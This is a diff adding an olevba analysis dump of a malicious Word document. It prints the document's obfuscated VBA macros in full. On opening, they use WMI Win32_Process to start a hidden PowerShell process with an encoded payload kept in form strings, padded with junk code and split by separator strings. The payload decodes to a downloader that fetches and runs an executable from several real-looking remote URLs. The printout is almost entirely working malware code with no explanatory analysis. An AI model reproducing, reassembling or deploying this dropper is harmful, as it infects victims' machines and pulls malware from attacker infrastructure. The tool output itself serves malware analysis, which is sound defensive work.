@@ -1,0 +1,365 @@
+olevba 26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+olevba 0.60.2 on Python 3.9.2 - http://decalage.info/python/oletools
+===============================================================================
+FILE: 26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO Vycejmzr.cls 
+in file: 26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx - OLE stream: 'Macros/VBA/Vycejmzr'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_open()
+Tbcepkcgnhpwx
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Bimqxgzblyrp.frm 
+in file: 26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx - OLE stream: 'Macros/VBA/Bimqxgzblyrp'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Flijvcefzoj.bas 
+in file: 26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx - OLE stream: 'Macros/VBA/Flijvcefzoj'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function Pitxyglphi()
+   Select Case Ewontzdrytyk
+      Case 5815
+         Dwkkvvkxhfhwq = Log(3331)
+         Iamzmqhgtwnq = 4
+         Odmxxoop = CSng(trrD0)
+      Case Kkhoifxibxqsm
+         Iwproifnwsc = ChrW(RSd)
+         Tngsyoobjsyny = 472
+         Zkvrbhpsyxn = Cos(rfTD3Iu)
+      Case 5
+         Xkwgkzpnr = 76
+         Yvozerdpdqnl = Atn(3391)
+         Tqevhvkxje = Sin(Rdzpbimbtftpo)
+End Select
+Hnkanudydg = ChrW(wdKeyP)
+   Select Case Nabshejvqztq
+      Case 5815
+         Izpjwccun = Log(3331)
+         Gistxlbg = 4
+         Wiqtrgvybqncu = CSng(trrD0)
+      Case Qefvrtmfp
+         Rbtoskcgmqzqf = ChrW(RSd)
+         Vlepdotnh = 472
+         Kqfjdarvoufm = Cos(rfTD3Iu)
+      Case 5
+         Zomqroaz = 76
+         Baayhyomixzla = Atn(3391)
+         Yzjhmpygme = Sin(Wprulgihc)
+End Select
+Drmrfxlv = Hnkanudydg + Bimqxgzblyrp.Banzydziriljk + Bimqxgzblyrp.Svndpgudl
+   Select Case Aozvwrrckhotr
+      Case 5815
+         Ivhqmzaug = Log(3331)
+         Pwtivkfqxyx = 4
+         Euqlbhgalz = CSng(trrD0)
+      Case Wfhyzutbfc
+         Bmeobcjkcv = ChrW(RSd)
+         Jpsympdwoaye = 472
+         Xeergcahjpds = Cos(rfTD3Iu)
+      Case 5
+         Qugbtppjbu = 76
+         Yxubnzqjefg = Atn(3391)
+         Jrcfdvtqtgt = Sin(Kicncjcqdcmib)
+End Select
+losd = Bimqxgzblyrp.Cvlpoddz.GroupName
+Yayiwzyefmtww = Split(Drmrfxlv + LTrim(LTrim(losd)), "//====dsfnnJJJsm388//=")
+   Select Case Ynahheexq
+      Case 5815
+         Qznnixxbsdiac = Log(3331)
+         Ooofayrhj = 4
+         Fvdtifgijri = CSng(trrD0)
+      Case Irvzeqmx
+         Qpjlcxyrekurb = ChrW(RSd)
+         Uduuhrfflxjds = 472
+         Rpowndyuelkz = Cos(rfTD3Iu)
+      Case 5
+         Hqpxajmrdjikj = 76
+         Sugoltfcekv = Atn(3391)
+         Qjxrbhdgtf = Sin(Gzlfocuaglqe)
+End Select
+Pitxyglphi = Dkmsucacshca + Join(Yayiwzyefmtww, "") + Dkmsucacshca
+   Select Case Zncvcdsoiodt
+      Case 5815
+         Pvpsbnpj = Log(3331)
+         Cpbourmj = 4
+         Rdlqgnbqw = CSng(trrD0)
+      Case Ckpudlbodgqaa
+         Cetqbuzklm = ChrW(RSd)
+         Lnlymjeaemuqg = 472
+         Qabdkwulxwgc = Cos(rfTD3Iu)
+      Case 5
+         Aditmqar = 76
+         Qwthpkcj = Atn(3391)
+         Ijkizcqcocghc = Sin(Imxuvvzt)
+End Select
+End Function
+Function Tbcepkcgnhpwx()
+d = "//====dsfnnJJJsm388//=i//====dsfnnJJJsm388//=//====dsfnnJJJsm388//=n//====dsfnnJJJsm388//=m//====dsfnnJJJsm388//=gmt//====dsfnnJJJsm388//=" + ChrW(wdKeyS) + "//====dsfnnJJJsm388//=:w//====dsfnnJJJsm388//=in//====dsfnnJJJsm388//=32//====dsfnnJJJsm388//=//====dsfnnJJJsm388//=_//====dsfnnJJJsm388//=" + Bimqxgzblyrp.Fmgsnpdkhc + "//====dsfnnJJJsm388//=ro//====dsfnnJJJsm388//=ce//====dsfnnJJJsm388//=ss"
+   Select Case Utqslcezgnb
+      Case 5815
+         Qqvtlseeyqmh = Log(3331)
+         Zahsqrozoswd = 4
+         Rtyyyjsu = CSng(trrD0)
+      Case Qfgjwcdkbhfyy
+         Seqbdxifcm = ChrW(RSd)
+         Ojbcfblclkfd = 472
+         Lcfwtvenfeb = Cos(rfTD3Iu)
+      Case 5
+         Yiaewqjpbafax = 76
+         Ziynopmfzftj = Atn(3391)
+         Dwamfmtl = Sin(Mczjczwvjm)
+End Select
+E = "//====dsfnnJJJsm388//="
+   Select Case Kuffqeeauqol
+      Case 5815
+         Yqhqqkta = Log(3331)
+         Iukdcjkfyb = 4
+         Mltvvokqfqgn = CSng(trrD0)
+      Case Misrbkwswvt
+         Lginjvfdwwupe = ChrW(RSd)
+         Hsnxknwbn = 472
+         Uwupycuq = Cos(rfTD3Iu)
+      Case 5
+         Xcxsnmqlxc = 76
+         Oldiwqkoevhi = Atn(3391)
+         Igyruoqyjq = Sin(Wbgppeeah)
+End Select
+Xqkvbflqzqf = Split("//====dsfnnJJJsm388//=//====dsfnnJJJsm388//=w//====dsfnnJJJsm388//=//====dsfnnJJJsm388//=" + d, E)
+   Select Case Klmvgidk
+      Case 5815
+         Lwhkcdldrvpth = Log(3331)
+         Gvyuoggkgmr = 4
+         Lbosnttx = CSng(trrD0)
+      Case Vtiozinqdnf
+         Epboemaxly = ChrW(RSd)
+         Qgwfofsxfdbg = 472
+         Btwoqukoj = Cos(rfTD3Iu)
+      Case 5
+         Eokhskuxxi = 76
+         Kpimdhbovwx = Atn(3391)
+         Bwipgcwtu = Sin(Hpnsgiuyzdl)
+End Select
+Dxyrjpkbey = Join(Xqkvbflqzqf, "")
+   Select Case Mkxfqyvd
+      Case 5815
+         Fiqwzxgrs = Log(3331)
+         Kbohdlhrwfv = 4
+         Vtimzygmyvkca = CSng(trrD0)
+      Case Fmggdncjiyn
+         Lpzktuagots = ChrW(RSd)
+         Clgdfdntmjz = 472
+         Hsjzomlrbi = Cos(rfTD3Iu)
+      Case 5
+         Jgxiqsom = 76
+         Qcfsjzvzgz = Atn(3391)
+         Mhwoefjwb = Sin(Cwxqlvrkcw)
+End Select
+Set Kmklezadnndt = GetObject(Dxyrjpkbey)
+   Select Case Edbihkklmu
+      Case 5815
+         Pacinunb = Log(3331)
+         Ncarclyxt = 4
+         Ejnyhwbn = CSng(trrD0)
+      Case Qkavvewrlfiy
+         Zipiynpavbk = ChrW(RSd)
+         Kfylolnwsaw = 472
+         Bfiftfmxy = Cos(rfTD3Iu)
+      Case 5
+         Tooeqoyke = 76
+         Lntunktgit = Atn(3391)
+         Ljrqhfeqlgrs = Sin(Igdblcqpuvmys)
+End Select
+Zaukgupzukbko = Bimqxgzblyrp.Wxyyjpiga.Tag
+Gwogdlclzeoc = Dxyrjpkbey + ChrW(wdKeyS) + Bimqxgzblyrp.Ypofkmlub.Tag + Zaukgupzukbko
+   Select Case Kfbxsflavfgzh
+      Case 5815
+         Jekboeejzi = Log(3331)
+         Dokqmexkcd = 4
+         Dhxrbjqs = CSng(trrD0)
+      Case Dbnwmsgwboh
+         Mkouvkwig = ChrW(RSd)
+         Xggmhqrsaq = 472
+         Cpreefbpuj = Cos(rfTD3Iu)
+      Case 5
+         Hmpvioewcf = 76
+         Ltplxotrb = Atn(3391)
+         Eefrdejooh = Sin(Uawkmlohx)
+End Select
+Krqugnrbj = Gwogdlclzeoc + Bimqxgzblyrp.Fmgsnpdkhc
+   Select Case Urfigeijqia
+      Case 5815
+         Wsnksgqbwsn = Log(3331)
+         Obhvluetidgb = 4
+         Ifxvbczcjbpb = CSng(trrD0)
+      Case Oyyrkmqgc
+         Fbtoogibmhvyx = ChrW(RSd)
+         Ulsggjeyejfor = 472
+         Bdcyvafo = Cos(rfTD3Iu)
+      Case 5
+         Hadytzafoseo = 76
+         Nadpejrrxjf = Atn(3391)
+         Zrvoxxkyjbzlk = Sin(Clznhnkuxq)
+End Select
+Set Tbcepkcgnhpwx = GetObject(Krqugnrbj)
+   Select Case Fdruplhbel
+      Case 5815
+         Lhowfwnrd = Log(3331)
+         Ztspjdvu = 4
+         Jwotfzieq = CSng(trrD0)
+      Case Wxsajvsvzjiq
+         Bxwyxjquablz = ChrW(RSd)
+         Xemmzkdvzoahd = 472
+         Vbfpaebl = Cos(rfTD3Iu)
+      Case 5
+         Gcbwqpjssyvx = 76
+         Ppfyixqfrqf = Atn(3391)
+         Kcvvsftth = Sin(Iyqplbiyfozly)
+End Select
+Tbcepkcgnhpwx. _
+showwindow = False
+   Select Case Uvqndmxwv
+      Case 5815
+         Npsmtkiz = Log(3331)
+         Akyycajdswg = 4
+         Sytsglaby = CSng(trrD0)
+      Case Tbjnxpks
+         Uksoalosdgt = ChrW(RSd)
+         Anasbosobw = 472
+         Arwfclojo = Cos(rfTD3Iu)
+      Case 5
+         Aegzmiuhiaq = 76
+         Xwjesbsnviztr = Atn(3391)
+         Ufiwczzo = Sin(Gfgpoejjwif)
+End Select
+Do While Kmklezadnndt. _
+Create(pok & Pitxyglphi, Esardgadikcwz, Tbcepkcgnhpwx, Ghednpwpd)
+Loop
+   Select Case Qahxsxebnscy
+      Case 5815
+         Ymltmhem = Log(3331)
+         Xihomcfvedbp = 4
+         Ycqfmsgb = CSng(trrD0)
+      Case Auqsmoqdvna
+         Ppkmhtsaiyj = ChrW(RSd)
+         Rzammwbtor = 472
+         Ipmxuabnnap = Cos(rfTD3Iu)
+      Case 5
+         Zhonrvgxd = 76
+         Djbejvaxxzy = Atn(3391)
+         Doyhgvqjy = Sin(Omgxvfpfsvu)
+End Select
+End Function
+
+
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Aftcurifh
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Osjxwkzzy
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Xlochkjxxph
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+o//====dsfnnJJJsm388//=w//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=r//====dsfnnJJJsm388//=s//====dsfnnJJJsm388//=h//====dsfnnJJJsm388//=el//====dsfnnJJJsm388//=l//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=-//====dsfnnJJJsm388//=w//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=h//====dsfnnJJJsm388//=i
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+d//====dsfnnJJJsm388//=d//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=n//====dsfnnJJJsm388//= //====dsfnnJJJsm388//=-//====dsfnnJJJsm388//=e//====dsfnnJJJsm388//=n 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Votcymrhgpjqb
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[Varios cientos de lineas en blanco eliminadas ara hacer este documento mas legible]
+
+JABLA//====dsfnnJJJsm388//=HEAbA//====dsfnnJJJsm388//=BkAGY//====dsfnnJJJsm388//=AbQBi//====dsfnnJJJsm388//=AHYAc//====dsfnnJJJsm388//=gA9AC//====dsfnnJJJsm388//=cAWAB//====dsfnnJJJsm388//=pAGQA//====dsfnnJJJsm388//=dgBvA//====dsfnnJJJsm388//=HIAYg//====dsfnnJJJsm388//=BrAGs//====dsfnnJJJsm388//=AYwBn//====dsfnnJJJsm388//=AHQAY//====dsfnnJJJsm388//=QAnAD//====dsfnnJJJsm388//=sAJAB//====dsfnnJJJsm388//=GAHkA//====dsfnnJJJsm388//=bQBiA//====dsfnnJJJsm388//=GgAeQ//====dsfnnJJJsm388//=BlAHg//====dsfnnJJJsm388//=AbQBo//====dsfnnJJJsm388//=ACAAP//====dsfnnJJJsm388//=QAgAC//====dsfnnJJJsm388//=cANQA//====dsfnnJJJsm388//=5ADMA//====dsfnnJJJsm388//=JwA7A//====dsfnnJJJsm388//=CQATg//====dsfnnJJJsm388//=BuAHI//====dsfnnJJJsm388//=AZwBx//====dsfnnJJJsm388//=AGkAa//====dsfnnJJJsm388//=wBrAG//====dsfnnJJJsm388//=YAcQB//====dsfnnJJJsm388//=5AD0A//====dsfnnJJJsm388//=JwBCA//====dsfnnJJJsm388//=GoAcw//====dsfnnJJJsm388//=BwAGM//====dsfnnJJJsm388//=AcABz//====dsfnnJJJsm388//=AGUAY//====dsfnnJJJsm388//=wBxAG//====dsfnnJJJsm388//=YAJwA//====dsfnnJJJsm388//=7ACQA//====dsfnnJJJsm388//=TwBzA//====dsfnnJJJsm388//=HgAag//====dsfnnJJJsm388//=BzAHU//====dsfnnJJJsm388//=AdgBi//====dsfnnJJJsm388//=AGIAe//====dsfnnJJJsm388//=AB6AG//====dsfnnJJJsm388//=MAPQA//====dsfnnJJJsm388//=kAGUA//====dsfnnJJJsm388//=bgB2A//====dsfnnJJJsm388//=DoAdQ//====dsfnnJJJsm388//=BzAGU//====dsfnnJJJsm388//=AcgBw//====dsfnnJJJsm388//=AHIAb//====dsfnnJJJsm388//=wBmAG//====dsfnnJJJsm388//=kAbAB//====dsfnnJJJsm388//=lACsA//====dsfnnJJJsm388//=JwBcA//====dsfnnJJJsm388//=CcAKw//====dsfnnJJJsm388//=AkAEY//====dsfnnJJJsm388//=AeQBt//====dsfnnJJJsm388//=AGIAa//====dsfnnJJJsm388//=AB5AG//====dsfnnJJJsm388//=UAeAB//====dsfnnJJJsm388//=tAGgA//====dsfnnJJJsm388//=KwAnA//====dsfnnJJJsm388//=C4AZQ//====dsfnnJJJsm388//=B4AGU//====dsfnnJJJsm388//=AJwA7//====dsfnnJJJsm388//=ACQAU//====dsfnnJJJsm388//=QBlAG//====dsfnnJJJsm388//=UAdwB//====dsfnnJJJsm388//=sAG8A//====dsfnnJJJsm388//=aAB2A//====dsfnnJJJsm388//=G4AaA//====dsfnnJJJsm388//=B6AGo//====dsfnnJJJsm388//=AZwA9//====dsfnnJJJsm388//=ACcAV//====dsfnnJJJsm388//=ABxAH//====dsfnnJJJsm388//=kAdAB//====dsfnnJJJsm388//=qAHgA//====dsfnnJJJsm388//=aQB0A//====dsfnnJJJsm388//=G8AZA//====dsfnnJJJsm388//=B4AHo//====dsfnnJJJsm388//=AZgAn//====dsfnnJJJsm388//=ADsAJ//====dsfnnJJJsm388//=ABQAH//====dsfnnJJJsm388//=YAcQB//====dsfnnJJJsm388//=rAHIA//====dsfnnJJJsm388//=bgBvA//====dsfnnJJJsm388//=GEAbw//====dsfnnJJJsm388//=A9ACY//====dsfnnJJJsm388//=AKAAn//====dsfnnJJJsm388//=AG4AZ//====dsfnnJJJsm388//=QB3AC//====dsfnnJJJsm388//=0AbwB//====dsfnnJJJsm388//=iACcA//====dsfnnJJJsm388//=KwAnA//====dsfnnJJJsm388//=GoAZQ//====dsfnnJJJsm388//=BjACc//====dsfnnJJJsm388//=AKwAn//====dsfnnJJJsm388//=AHQAJ//====dsfnnJJJsm388//=wApAC//====dsfnnJJJsm388//=AAbgB//====dsfnnJJJsm388//=FAFQA//====dsfnnJJJsm388//=LgBXA//====dsfnnJJJsm388//=GUAYg//====dsfnnJJJsm388//=BjAEw//====dsfnnJJJsm388//=ASQBF//====dsfnnJJJsm388//=AG4Ad//====dsfnnJJJsm388//=AA7AC//====dsfnnJJJsm388//=QARgB//====dsfnnJJJsm388//=rAG0A//====dsfnnJJJsm388//=bgBnA//====dsfnnJJJsm388//=GkAdA//====dsfnnJJJsm388//=BnAGE//====dsfnnJJJsm388//=APQAn//====dsfnnJJJsm388//=AGgAd//====dsfnnJJJsm388//=AB0AH//====dsfnnJJJsm388//=AAOgA//====dsfnnJJJsm388//=vAC8A//====dsfnnJJJsm388//=bwBuA//====dsfnnJJJsm388//=GkAbw//====dsfnnJJJsm388//=BuAGc//====dsfnnJJJsm388//=AYQBt//====dsfnnJJJsm388//=AGUAc//====dsfnnJJJsm388//=wAuAG//====dsfnnJJJsm388//=oAcAA//====dsfnnJJJsm388//=vAGMA//====dsfnnJJJsm388//=bwBuA//====dsfnnJJJsm388//=HQAYQ//====dsfnnJJJsm388//=BjAHQ//====dsfnnJJJsm388//=ALwBp//====dsfnnJJJsm388//=AFkAL//====dsfnnJJJsm388//=wAqAG//====dsfnnJJJsm388//=gAdAB//====dsfnnJJJsm388//=0AHAA//====dsfnnJJJsm388//=OgAvA//====dsfnnJJJsm388//=C8AcA//====dsfnnJJJsm388//=BtAHQ//====dsfnnJJJsm388//=AaABv//====dsfnnJJJsm388//=AG0AZ//====dsfnnJJJsm388//=QAuAG//====dsfnnJJJsm388//=MAbwB//====dsfnnJJJsm388//=tAC8A//====dsfnnJJJsm388//=cABvA//====dsfnnJJJsm388//=HMAdA//====dsfnnJJJsm388//=BhAC8//====dsfnnJJJsm388//=AZABy//====dsfnnJJJsm388//=ADMAe//====dsfnnJJJsm388//=gB4AG//====dsfnnJJJsm388//=EALwA//====dsfnnJJJsm388//=qAGgA//====dsfnnJJJsm388//=dAB0A//====dsfnnJJJsm388//=HAAOg//====dsfnnJJJsm388//=AvAC8//====dsfnnJJJsm388//=AdQBy//====dsfnnJJJsm388//=AGcAZ//====dsfnnJJJsm388//=QB2AG//====dsfnnJJJsm388//=UAbgB//====dsfnnJJJsm388//=0AGEA//====dsfnnJJJsm388//=LgBlA//====dsfnnJJJsm388//=HMALw//====dsfnnJJJsm388//=BpAG0//====dsfnnJJJsm388//=AZwAv//====dsfnnJJJsm388//=AGsAM//====dsfnnJJJsm388//=wA1AG//====dsfnnJJJsm388//=QAOQB//====dsfnnJJJsm388//=xAC8A//====dsfnnJJJsm388//=KgBoA//====dsfnnJJJsm388//=HQAdA//====dsfnnJJJsm388//=BwAHM//====dsfnnJJJsm388//=AOgAv//====dsfnnJJJsm388//=AC8Ac//====dsfnnJJJsm388//=wBvAG//====dsfnnJJJsm388//=wAbQB//====dsfnnJJJsm388//=lAGMA//====dsfnnJJJsm388//=LgBjA//====dsfnnJJJsm388//=G8AbQ//====dsfnnJJJsm388//=AuAGE//====dsfnnJJJsm388//=AcgAv//====dsfnnJJJsm388//=AHMAa//====dsfnnJJJsm388//=QB0AG//====dsfnnJJJsm388//=kAbwA//====dsfnnJJJsm388//=vAG4A//====dsfnnJJJsm388//=VABYA//====dsfnnJJJsm388//=FoAbw//====dsfnnJJJsm388//=BtAEs//====dsfnnJJJsm388//=AQwB4//====dsfnnJJJsm388//=AC8AK//====dsfnnJJJsm388//=gBoAH//====dsfnnJJJsm388//=QAdAB//====dsfnnJJJsm388//=wAHMA//====dsfnnJJJsm388//=OgAvA//====dsfnnJJJsm388//=C8AdA//====dsfnnJJJsm388//=BpAGE//====dsfnnJJJsm388//=AZwBv//====dsfnnJJJsm388//=AGMAY//====dsfnnJJJsm388//=QBtAG//====dsfnnJJJsm388//=IAYQB//====dsfnnJJJsm388//=yAGEA//====dsfnnJJJsm388//=LgBjA//====dsfnnJJJsm388//=G8AbQ//====dsfnnJJJsm388//=AvAGM//====dsfnnJJJsm388//=AZwBp//====dsfnnJJJsm388//=AC0AY//====dsfnnJJJsm388//=gBpAG//====dsfnnJJJsm388//=4ALwB//====dsfnnJJJsm388//=zADkA//====dsfnnJJJsm388//=NgAvA//====dsfnnJJJsm388//=CcALg//====dsfnnJJJsm388//=AiAFM//====dsfnnJJJsm388//=AcABM//====dsfnnJJJsm388//=AGAAS//====dsfnnJJJsm388//=QBUAC//====dsfnnJJJsm388//=IAKAA//====dsfnnJJJsm388//=nACoA//====dsfnnJJJsm388//=JwApA//====dsfnnJJJsm388//=DsAJA//====dsfnnJJJsm388//=BYAG0//====dsfnnJJJsm388//=AdgB0//====dsfnnJJJsm388//=AHMAZ//====dsfnnJJJsm388//=gBmAG//====dsfnnJJJsm388//=oAZgB//====dsfnnJJJsm388//=qAD0A//====dsfnnJJJsm388//=JwBOA//====dsfnnJJJsm388//=GIAcw//====dsfnnJJJsm388//=BmAHY//====dsfnnJJJsm388//=AYQB2//====dsfnnJJJsm388//=AGsAb//====dsfnnJJJsm388//=QBzAG//====dsfnnJJJsm388//=wAYgA//====dsfnnJJJsm388//=nADsA//====dsfnnJJJsm388//=ZgBvA//====dsfnnJJJsm388//=HIAZQ//====dsfnnJJJsm388//=BhAGM//====dsfnnJJJsm388//=AaAAo//====dsfnnJJJsm388//=ACQAU//====dsfnnJJJsm388//=QB0AH//====dsfnnJJJsm388//=kAawB//====dsfnnJJJsm388//=tAGcA//====dsfnnJJJsm388//=cAB5A//====dsfnnJJJsm388//=HkAYw//====dsfnnJJJsm388//=B6AHk//====dsfnnJJJsm388//=AIABp//====dsfnnJJJsm388//=AG4AI//====dsfnnJJJsm388//=AAkAE//====dsfnnJJJsm388//=YAawB//====dsfnnJJJsm388//=tAG4A//====dsfnnJJJsm388//=ZwBpA//====dsfnnJJJsm388//=HQAZw//====dsfnnJJJsm388//=BhACk//====dsfnnJJJsm388//=AewB0//====dsfnnJJJsm388//=AHIAe//====dsfnnJJJsm388//=QB7AC//====dsfnnJJJsm388//=QAUAB//====dsfnnJJJsm388//=2AHEA//====dsfnnJJJsm388//=awByA//====dsfnnJJJsm388//=G4Abw//====dsfnnJJJsm388//=BhAG8//====dsfnnJJJsm388//=ALgAi//====dsfnnJJJsm388//=AGQAY//====dsfnnJJJsm388//=ABPAF//====dsfnnJJJsm388//=cAbgB//====dsfnnJJJsm388//=sAG8A//====dsfnnJJJsm388//=YQBgA//====dsfnnJJJsm388//=EQAZg//====dsfnnJJJsm388//=BJAGw//====dsfnnJJJsm388//=ARQAi//====dsfnnJJJsm388//=ACgAJ//====dsfnnJJJsm388//=ABRAH//====dsfnnJJJsm388//=QAeQB//====dsfnnJJJsm388//=rAG0A//====dsfnnJJJsm388//=ZwBwA//====dsfnnJJJsm388//=HkAeQ//====dsfnnJJJsm388//=BjAHo//====dsfnnJJJsm388//=AeQAs//====dsfnnJJJsm388//=ACAAJ//====dsfnnJJJsm388//=ABPAH//====dsfnnJJJsm388//=MAeAB//====dsfnnJJJsm388//=qAHMA//====dsfnnJJJsm388//=dQB2A//====dsfnnJJJsm388//=GIAYg//====dsfnnJJJsm388//=B4AHo//====dsfnnJJJsm388//=AYwAp//====dsfnnJJJsm388//=ADsAJ//====dsfnnJJJsm388//=ABMAH//====dsfnnJJJsm388//=EAcwB//====dsfnnJJJsm388//=uAG8A//====dsfnnJJJsm388//=YwBpA//====dsfnnJJJsm388//=GMAaw//====dsfnnJJJsm388//=A9ACc//====dsfnnJJJsm388//=ATQB3//====dsfnnJJJsm388//=AHIAb//====dsfnnJJJsm388//=gBoAH//====dsfnnJJJsm388//=MAawB//====dsfnnJJJsm388//=6AGUA//====dsfnnJJJsm388//=dQBzA//====dsfnnJJJsm388//=CcAOw//====dsfnnJJJsm388//=BJAGY//====dsfnnJJJsm388//=AIAAo//====dsfnnJJJsm388//=ACgAJ//====dsfnnJJJsm388//=gAoAC//====dsfnnJJJsm388//=cARwB//====dsfnnJJJsm388//=lACcA//====dsfnnJJJsm388//=KwAnA//====dsfnnJJJsm388//=HQAJw//====dsfnnJJJsm388//=ArACc//====dsfnnJJJsm388//=ALQBJ//====dsfnnJJJsm388//=AHQAZ//====dsfnnJJJsm388//=QBtAC//====dsfnnJJJsm388//=cAKQA//====dsfnnJJJsm388//=gACQA//====dsfnnJJJsm388//=TwBzA//====dsfnnJJJsm388//=HgAag//====dsfnnJJJsm388//=BzAHU//====dsfnnJJJsm388//=AdgBi//====dsfnnJJJsm388//=AGIAe//====dsfnnJJJsm388//=AB6AG//====dsfnnJJJsm388//=MAKQA//====dsfnnJJJsm388//=uACIA//====dsfnnJJJsm388//=bABgA//====dsfnnJJJsm388//=GUATg//====dsfnnJJJsm388//=BnAGA//====dsfnnJJJsm388//=AVABo//====dsfnnJJJsm388//=ACIAI//====dsfnnJJJsm388//=AAtAG//====dsfnnJJJsm388//=cAZQA//====dsfnnJJJsm388//=gADMA//====dsfnnJJJsm388//=NgA5A//====dsfnnJJJsm388//=DUAMg//====dsfnnJJJsm388//=ApACA//====dsfnnJJJsm388//=AewBb//====dsfnnJJJsm388//=AEQAa//====dsfnnJJJsm388//=QBhAG//====dsfnnJJJsm388//=cAbgB//====dsfnnJJJsm388//=vAHMA//====dsfnnJJJsm388//=dABpA//====dsfnnJJJsm388//=GMAcw//====dsfnnJJJsm388//=AuAFA//====dsfnnJJJsm388//=AcgBv//====dsfnnJJJsm388//=AGMAZ//====dsfnnJJJsm388//=QBzAH//====dsfnnJJJsm388//=MAXQA//====dsfnnJJJsm388//=6ADoA//====dsfnnJJJsm388//=IgBTA//====dsfnnJJJsm388//=GAAVA//====dsfnnJJJsm388//=BBAFI//====dsfnnJJJsm388//=AdAAi//====dsfnnJJJsm388//=ACgAJ//====dsfnnJJJsm388//=ABPAH//====dsfnnJJJsm388//=MAeAB//====dsfnnJJJsm388//=qAHMA//====dsfnnJJJsm388//=dQB2A//====dsfnnJJJsm388//=GIAYg//====dsfnnJJJsm388//=B4AHo//====dsfnnJJJsm388//=AYwAp//====dsfnnJJJsm388//=ADsAJ//====dsfnnJJJsm388//=ABaAG//====dsfnnJJJsm388//=oAYwB//====dsfnnJJJsm388//=5AGUA//====dsfnnJJJsm388//=YgB0A//====dsfnnJJJsm388//=HUAPQ//====dsfnnJJJsm388//=AnAFA//====dsfnnJJJsm388//=AcQBy//====dsfnnJJJsm388//=AHYAa//====dsfnnJJJsm388//=ABrAG//====dsfnnJJJsm388//=wAcQB//====dsfnnJJJsm388//=lAHIA//====dsfnnJJJsm388//=aQBlA//====dsfnnJJJsm388//=CcAOw//====dsfnnJJJsm388//=BiAHI//====dsfnnJJJsm388//=AZQBh//====dsfnnJJJsm388//=AGsAO//====dsfnnJJJsm388//=wAkAE//====dsfnnJJJsm388//=YAegB//====dsfnnJJJsm388//=iAGIA//====dsfnnJJJsm388//=dQBuA//====dsfnnJJJsm388//=HQAdQ//====dsfnnJJJsm388//=B1AGw//====dsfnnJJJsm388//=AcABz//====dsfnnJJJsm388//=AGcAP//====dsfnnJJJsm388//=QAnAE//====dsfnnJJJsm388//=0AdQB//====dsfnnJJJsm388//=zAG0A//====dsfnnJJJsm388//=eAB4A//====dsfnnJJJsm388//=HEAYg//====dsfnnJJJsm388//=BvACc//====dsfnnJJJsm388//=AfQB9//====dsfnnJJJsm388//=AGMAY//====dsfnnJJJsm388//=QB0AG//====dsfnnJJJsm388//=MAaAB//====dsfnnJJJsm388//=7AH0A//====dsfnnJJJsm388//=fQAkA//====dsfnnJJJsm388//=EoAYg//====dsfnnJJJsm388//=ByAGg//====dsfnnJJJsm388//=AdAB2//====dsfnnJJJsm388//=AGcAZ//====dsfnnJJJsm388//=gB0AG//====dsfnnJJJsm388//=YAegB//====dsfnnJJJsm388//=zAD0A//====dsfnnJJJsm388//=JwBCA//====dsfnnJJJsm388//=HYAdg//====dsfnnJJJsm388//=BnAGc//====dsfnnJJJsm388//=AcABk//====dsfnnJJJsm388//=AGkAa//====dsfnnJJJsm388//=wBzAH//====dsfnnJJJsm388//=cAcQB//====dsfnnJJJsm388//=yACcApj
+-------------------------------------------------------------------------------
+VBA FORM STRING IN '26ba3fe65926140305a8fa605d09b8bd2fb8251648eac9b3165fb884a506e837.docx' - OLE stream: 'Macros/Bimqxgzblyrp/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Fletrfawfuzto
